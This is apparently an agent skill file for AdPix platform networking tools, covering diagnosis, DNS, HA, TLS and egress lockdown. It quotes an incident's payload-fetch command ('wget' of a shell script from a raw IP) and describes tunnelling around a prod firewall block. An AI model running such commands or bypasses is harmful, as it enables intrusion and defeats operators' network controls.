---
name: adpix-network
description: Advanced networking for the AdPix platform — diagnose slow/broken links (net_diag/net_probe), bridge egress for air-gapped/filtered installs (net_bridge), plan the platform DNS (dns_plan), stand up the HA VIP + quorum (ha_standup/cluster_status), manage per-FQDN TLS (cert_install/tls_status), and lock container egress default-deny (egress_lockdown, the IR 3.4 fix). Use when a link is slow/broken, when planning DNS, setting up HA, managing certs, or locking down egress.
---

# AdPix advanced networking

Prereq: read **adpix-devops**. Tools (load via `ToolSearch "select:mcp__adpix-devops__<name>"`): `net_probe`, `net_diag`, `net_bridge`, `dns_plan`, `cert_install`, `tls_status`, `ha_standup`, `cluster_status`, `ha_quorum`, `cluster_define`, `egress_lockdown`, `connect_configs`. Prefer these over raw `run_command`.

## Diagnose a slow / broken link
- `net_diag server=<name> hosts:["1.1.1.1:443","github.com:443",...] trace:true` — the deep read-out: default route + iface + **MTU**, DNS resolution + timing, TCP reachability + **round-trip latency per host:port**, path hops (traceroute/mtr), and the public-vs-loopback listening surface. Read-only.
  - Slow/hung large transfers, fast small ones → **MTU black-hole**: lower the iface/tunnel MTU.
  - DNS line slow or `resolve FAILED` → resolver problem, not the app.
  - `net_diag` flags **more than SSH/80/443 exposed** → run `security_audit` → **adpix-harden**.
- `net_probe server=<name>` — the install-oriented verdict: can the target reach the internet, GitHub, Docker Hub/GHCR, apt + npm mirrors, and is docker+git present → **online / filtered / offline** + what to do. Read-only. Run it before any install on a new box.

## Air-gapped / filtered install egress
Flow: `net_probe` → if **filtered/offline** → `net_bridge action:up` → install → `net_bridge action:down`.
- `net_bridge` tunnels the target's apt + docker daemon + git + shell env through the **MCP host's** internet (reverse SSH proxy). `action:up` configures + verifies GitHub/Docker reachability; `action:status` reports; `action:down` tears it down + restores direct egress. The MCP host must have internet; the target's sshd needs `AllowTcpForwarding yes`.
- On the **188.121.x prod nodes** the blocker is the **Google egress block** (gcr.io / proxy.golang.org), not full air-gap. `net_bridge` routes around it, but the field-proven path for prod-node builds is build-on-tagmanager + image relay — see **adpix-offline-build**. Last resort with no bridge: `offline_bundle` / `offline_install`.

## Platform DNS
- `dns_plan` → the exact records + a copy-paste BIND snippet + `dig` verification. Split:
  - **control-plane `*.adpix.io` → the HA VIP** (un-proxied, so failover is transparent),
  - **data-plane `*.adpix.net` → the CDN origin** (proxied),
  - **`mcp.<domain>` → the MCP host**.
  - Reads the cluster's hosts/VIP from the registry. Plan-only — it never touches a DNS provider.
- The 8 launch hosts: `analytics / account / tagmanager / api .adpix.io` + `cdn / collect / config / gateway .adpix.net`.

## HA VIP + quorum
- `cluster_define` (witness + nodes + vip) if the cluster isn't in the registry yet; `cluster_status` rolls up member reachability + role + what each runs + the live **VIP HTTP check** — and flags a witness that's serving user traffic (it must not).
- `ha_standup mode:plan` (read-only) → the full standup. Then:
  - `mode:keepalived confirm:true` — the floating **VIP** (node-a MASTER / node-b BACKUP, unicast VRRP on `iface` [default eth0, vrid 51], gated on the local Caddy front door → **releases the VIP if the front door dies**). VIP defaults to the cluster's vip.
  - `mode:sentinel confirm:true` — Redis Sentinel across all 3 (witness = 3rd vote, quorum 2). **PREREQ:** publish Redis on the private VPC IP — compose-internal Redis won't cross nodes.
- Data tier: `pg_replication` (PG primary + sync standby), `ha_quorum mode:keeper-config` (3-node ClickHouse Keeper XML with the witness as tie-break). Verify with `ha_quorum mode:status` + `cluster_status`. Rolling code deploys: `bluegreen_deploy` (confirm:true).

## Per-FQDN TLS
- Caddy auto-issues Let's Encrypt once DNS + `:80` land — `tls_status` shows issuer / validity / days remaining (**under 14 days = renewal is failing** → check `:80` reachability + caddy logs).
- `cert_install domain:<fqdn>` for internal-CA / commercial / air-gapped TLS where LE isn't reachable: pushes a stored cert (matches the FQDN against SANs, so one `*.adpix.io` wildcard covers every sub-domain) to `/etc/adpix/tls/<fqdn>/{fullchain.pem,key.pem}` and returns the exact Caddy `tls` directive. `reload:true` reloads a system Caddy.

## Lock container egress (IR 3.4)
- `egress_lockdown action:report` (read-only) → the current DOCKER-USER posture.
- `egress_lockdown action:apply confirm:true` → default-**deny** app-container OUTBOUND (allows established, DNS, private/inter-container ranges, and `allowHosts:[...]` resolved on the target); DROP the rest leaving the external iface. `action:teardown confirm:true` removes it.
- Apply at **RUNTIME** (after install/build, when the app no longer pulls). Add `allowHosts` for legit callouts (e.g. `api.stripe.com`, `goproxy.io`, `db-ip.com`). Rules are runtime-only — **not reboot-persistent**; persist via the host firewall. This neuters payload-pull on RCE (the prod1 `wget http://77.90.13.20/1.sh`). Part of the **adpix-harden** posture.

## Client connect configs
- `connect_configs` → ready-to-use MCP client configs (Claude Code one-liner / Desktop JSON / generic / SSH-tunnel). The Bearer token is **masked** by default; `reveal:true` only into a mode-600 file, never a shared log.

## Env realities (from adpix-devops)
- **Google egress blocked** on the 188.121.x prod nodes (firewall unchangeable) → `net_diag`/`net_probe` to gcr.io / proxy.golang.org will read UNREACHABLE; that's the block, not a fault.
- **prod1 ↔ prod3 cross-node isolation** (different subnets) — direct cross-node reachability is expected to FAIL. Move files via the **tagmanager relay** (~0.85 MB/s, run detached); tagmanager reaches everything and is the net_bridge/build anchor.
- prod nodes: SSH port **1349**, user **ubuntu**.

## Phase-2 gaps (not yet tooled — do manually via run_command, confirm:true for destructive)
- **WireGuard mesh** between nodes (the proper fix for prod1↔prod3 isolation).
- **Microsegmentation** — per-service network policy beyond `egress_lockdown`'s coarse allow-list.
- **DNSSEC + CAA** — `dns_plan` is plan-only; no zone signing or CAA pinning yet.

## Related skills
**adpix-devops** (env map, read first) · **adpix-harden** (firewall/egress/exposed-surface remediation) · **adpix-host-migrate** (network aliasing + the DNS cutover) · **adpix-offline-build** (the Google-block build path) · **adpix-incident** (why egress_lockdown exists).
